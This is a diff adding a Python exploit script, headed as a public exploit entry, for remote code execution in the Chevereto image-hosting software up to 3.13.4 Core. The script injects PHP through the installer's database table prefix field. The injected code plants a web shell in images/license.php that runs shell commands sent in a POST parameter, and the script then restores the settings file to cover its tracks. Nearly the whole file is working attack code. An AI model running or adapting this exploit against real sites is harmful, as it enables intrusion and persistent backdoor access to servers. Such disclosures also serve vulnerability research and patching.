@@ -1,0 +1,60 @@
+# Exploit Title:  Chevereto 3.13.4 Core - Remote Code Execution  
+# Date: 2020-01-11
+# Exploit Author: Jinny Ramsmark 
+# Vendor Homepage:  https://chevereto.com/
+# Software Link: https://github.com/Chevereto/Chevereto-Free/releases
+# Version:  1.0.0 Free - 1.1.4 Free, <= 3.13.4 Core
+# Tested on: Ubuntu 19.10, PHP 7.3, Apache/2.4.41
+# CVE : N/A
+
+from urllib import request, parse
+from time import sleep
+
+#Python3
+#Needs to have a valid database server, database and user to exploit
+#1.0.0 Free version confirmed vulnerable
+#1.1.4 Free version confirmed vulnerable
+#3.13.4 Core version confirmed vulnerable
+
+def main():
+
+    target = 'http://cheveretoinstallation/'
+    cookie = 'PHPSESSID=89efba681a8bb81d32cd10d3170baf6e'
+    db_host = 'ip_to_valid_mysql'
+    db_name = 'valid_db'
+    db_user = 'valid_user'
+    db_pass = 'valid_pass'
+    db_table_prefix = 'chv_'
+
+    inject = "';if(strpos(file_get_contents('images/license.php'), '$_POST[\"ccc\"]') === false){file_put_contents('images/license.php','if(isset($_POST[\"ccc\"])){;system($_POST[\"ccc\"]);}');}//"
+
+    #Clean data for when we want to clean up the settings file
+    params = {'db_host': db_host, 'db_name': db_name, 'db_user': db_user, 'db_pass': db_pass, 'db_table_prefix': db_table_prefix}
+    data = parse.urlencode(params).encode()
+
+    #Settings data with injected code
+    params['db_table_prefix'] += inject
+    dataInject = parse.urlencode(params).encode()
+
+    #Do inject
+    doPostRequest(target + 'install', dataInject, cookie)
+    sleep(1)
+
+    #Request index page to run the injected code
+    doRequest(target)
+
+    sleep(1)
+    #Do a clean request to clean up the settings.php file
+    doPostRequest(target + 'install', data, cookie)
+
+def doPostRequest(target, data, cookie):
+    req = request.Request(target, data=data)
+    req.add_header('Cookie', cookie)
+    resp = request.urlopen(req)
+
+def doRequest(target):
+    req = request.Request(target)
+    resp = request.urlopen(req)
+
+if __name__ == '__main__':
+    main()
